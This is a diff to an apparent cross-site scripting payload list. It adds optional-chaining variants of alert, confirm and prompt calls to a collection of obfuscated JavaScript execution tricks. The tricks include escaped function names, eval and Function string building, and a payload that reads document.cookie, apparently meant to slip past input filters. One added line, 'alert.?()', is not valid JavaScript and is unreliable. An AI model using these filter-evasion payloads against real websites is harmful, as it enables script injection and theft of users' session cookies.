@@ -224,6 +224,7 @@ al\u0065rt(1)
 top[‘al\145rt’](1)
 top[‘al\x65rt’](1)
 top[8680439..toString(30)](1)
+alert.?()
 
 confirm()
 confirm``
@@ -232,6 +233,7 @@ confirm``
 [confirm``]
 (((confirm)))``
 co\u006efirm()
+confirm?.()
 new class extends confirm``{}
 [8].find(confirm)
 [8].map(confirm)
@@ -243,7 +245,7 @@ new class extends confirm``{}
 self[`aler`%2b`t`]`1`
 'new Function`al\ert\`1\``'
 'new Function`pro\mpt\`1\``'
-
+prompt?.()
 alert(document['cookie']) 
 with(document)alert(cookie) 
 eval('ale'+'rt(1)')window['alert'](0)
